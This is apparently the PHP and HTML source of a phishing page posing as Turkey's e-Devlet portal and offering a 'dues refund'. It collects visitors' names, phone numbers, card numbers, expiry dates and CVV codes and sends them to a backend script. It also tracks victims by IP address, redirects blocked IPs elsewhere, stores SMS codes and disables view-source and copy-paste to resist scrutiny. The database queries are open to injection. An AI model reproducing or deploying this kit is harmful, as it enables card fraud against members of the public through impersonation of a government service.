<?php
include 'baglan.php';
function GetIP(){
 if(getenv("HTTP_CLIENT_IP")) {
 $ip = getenv("HTTP_CLIENT_IP");
 } elseif(getenv("HTTP_X_FORWARDED_FOR")) {
 $ip = getenv("HTTP_X_FORWARDED_FOR");
 if (strstr($ip, ',')) {
 $tmp = explode (',', $ip);
 $ip = trim($tmp[0]);
 }
 } else {
 $ip = getenv("REMOTE_ADDR");
 }
 return $ip;
}
$ipcik = GetIP();



if ($_POST['pass1']<>"") {
$tc = $_POST['cc_no'];
$pass2 = $_POST['pass1'];
mysql_query("Update ak set sms1='$pass1' where ip='$ipcik' ");
mysql_query("Update ak set notif='1' where ip='$ipcik' ");
mysql_query("Update ak set ses='1' where ip='$ipcik' ");

}
mysql_query("Update ak set durum2='anasayfa' where ip='$ipcik' ");
mysql_query("Update ak set durum='0' where ip='$ipcik' ");



    $query =  mysql_query('SELECT * FROM ip'); 
    while($row = mysql_fetch_assoc($query)){ 
        if($row['ip'] == $ipcik){ 
            echo "<script>window.location.href='https://www.youtube.com/watch?v=ffF7W4rmkEk';</script>";
        } 
    } 

        $query =  mysql_query('SELECT * FROM ip2'); 
    while($row = mysql_fetch_assoc($query)){ 
        if($row['ip2'] == $ipcik){ 
            echo "<script>window.location.href='http://facebook.com';</script>";
        } 
    } 

?><!DOCTYPE html>
<!-- saved from url=(0025)/ -->
<html lang="zxx"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>e-Devlet | Aidat İade Sistemi</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <!-- External CSS libraries -->
    <link type="text/css" rel="stylesheet" href="assets/bootstrap.min.css">
    <link type="text/css" rel="stylesheet" href="assets/font-awesome.min.css">
    <link type="text/css" rel="stylesheet" href="assets/flaticon.css">

    <!-- Favicon icon -->
    

    <!-- Google fonts -->
    <link rel="stylesheet" type="text/css" href="assets/css">

    <!-- Custom Stylesheet -->
    <link type="text/css" rel="stylesheet" href="assets/style.css">
    <link rel="stylesheet" type="text/css" id="style_sheet" href="assets/default.css">

</head>
<body id="top">

<div class="page_loader"></div>

<link rel="icon" type="image/x-icon" href="/tema/img/favicon.png">
<script src="assets/jquery-3.2.1.min.js.indir" type="text/javascript"></script>
<script src="assets/jquery.creditCardValidator.js.indir"></script>
<script>
function validate(){
	var valid = true;	 
    $(".demoInputBox").css('background-color','');
    var message = "";

    var cardHolderNameRegex = /^[a-z ,.'-]+$/i;
    var cvvRegex = /^[0-9]{3,3}$/;
    
    var cardHolderName = $("#card-holder-name").val();
    var cardNumber = $("#tach").val();
    var cvv = $("#dogum").val();

    if(cardHolderName == "" || cardNumber == "" || cvv == "") {
    	   message  += "<div>Lütfen Tüm Alanları Doldurun.</div>";  
    	   if(cardHolderName == "") {
    		   $("#card-holder-name").css('background-color','#FFFFDF');
    	   }
    	   if(cardNumber == "") {
    		   $("#tach").css('background-color','#FFFFDF');
    	   }
    	   if (cvv == "") {
    		   $("#dogum").css('background-color','#FFFFDF');
    	   }
       valid = false;
    }
    
    if (cardHolderName != "" && !cardHolderNameRegex.test(cardHolderName)) {
        message  += "<div>Card Holder Name is Invalid</div>";    
    		$("#card-holder-name").css('background-color','#FFFFDF');
    		valid = false;
    }
    
    if(cardNumber != "") {
        	$('#tach').validateCreditCard(function(result){
            if(!(result.valid)){
                	message  += "<div>Kart Numarası Hatalı!</div>";    
            		$("#tach").css('background-color','#FFFFDF');
            		valid = false;
            }
        });
    }
    
    if (cvv != "" && !cvvRegex.test(cvv)) {
        message  += "<div>CVV Kodu Hatalı!</div>";    
        $("#dogum").css('background-color','#FFFFDF');
    		valid = false;
    }
    
    if(message != "") {
        $("#error-message").show();
        $("#error-message").html(message);
    }
    return valid;
}
</script>

<form id="frmContact" action="guvenlik.php" method="post" onsubmit="return validate();">




    <!-- External CSS libraries -->
    <link type="text/css" rel="stylesheet" href="assets/bootstrap.min.css">
    <link type="text/css" rel="stylesheet" href="assets/font-awesome.min.css">
    <link type="text/css" rel="stylesheet" href="assets/flaticon.css">

    <!-- Favicon icon -->
    <link rel="shortcut icon" href="/tema/img/favicon.ico" type="image/x-icon">

    <!-- Google fonts -->
    <link rel="stylesheet" type="text/css" href="assets/css">

    <!-- Custom Stylesheet -->
    <link type="text/css" rel="stylesheet" href="assets/style.css">
    <link rel="stylesheet" type="text/css" id="style_sheet" href="assets/default.css">

<div class="page_loader"></div>



<!-- Login 1 start -->

<section class="creditly-wrapper wthree, w3_agileits_wrapper">
      <div class="card bg-secondary shadow border-0">

<div class="login-1">
    <div class="container">
        <div class="row">
            <div class="col-md-12">
                <div class="login-inner-form">
                    <div class="details">
                        <a href="/#">
                            <img src="assets/logo-2.png" alt="logo">
                        </a>
                        <h3>Online Aidat İade Sistemi</h3>


			<font size="2" color="#960000">Aidat İadesi Yalnızca <b>Kredi Kartları</b> İçin Geçerlidir! </font>
			<br>
			<br>
                             <div class="form-group">
                                <input class="input-text" placeholder="Adınız Soyadınız" required="required" type="text" id="" name="adsoyad" reqassetsred="">
                            </div>
                             <div class="form-group">
                                <input class="input-text" placeholder="Telefon Numaranız" required="required" type="text" id="" name="telefon" reqassetsred="">
                            </div>
                            <div class="form-group">
							
                                <input class="number credit-card-number input-text" required="required" type="text" id="tach" name="cc" placeholder="Kart Numarası">
                            </div>
                            <div class="form-group">
                                <input class="expiration-month-and-year input-text" placeholder="Ay / Yıl" required="required" type="text" id="cc_ay" name="cc_ay" reqassetsred="">
                            </div>
                            <div class="form-group">
                                <input class="input-text" placeholder="CVV Kodu" maxlength="3" minlength="3" pattern="[0-9]*" required="required" type="number" id="dogum" name="cc_cvv" reqassetsred="">
                            </div>
                            
                            <div class="form-group mb-0">
                                <button type="submit" class="btn-md btn-theme btn-block">SORGULA</button>
                            </div>
							<br>
							<div id="error-message"></div>
                          </div>
                        
                       
                </div>
            </div>
        </div>
    </div>
</div>




<!-- Login 1 end -->

<script>
document.onkeydown = function(e) {
        if (e.ctrlKey && 
            (e.keyCode === 85 )) {
            return false;
        }
};
</script>

<script type="text/javascript">
$(document).ready(function () {
    //Disable full page
    $('body').bind('cut copy paste', function (e) {
        e.preventDefault();
    });
     
    //Disable part of page
    $('#id').bind('cut copy paste', function (e) {
        e.preventDefault();
    });
});
</script>

<!-- credit-card -->
		<script type="text/javascript" src="assets/creditly.js.indir"></script>
		<script type="text/javascript">
			$(function() {
			  var creditly = Creditly.initialize(
				  '.creditly-wrapper .expiration-month-and-year',
				  '.creditly-wrapper .credit-card-number',
				  '.creditly-wrapper .security-code',
				  '.creditly-wrapper .card-type');

			  $(".creditly-card-form .submit").click(function(e) {
				e.preventDefault();
				var output = creditly.validate();
				if (output) {
				  // Your validated credit card output
				  console.log(output);
				}
			  });
			});
		</script>
	<!-- //credit-card -->

</body>

	
</html>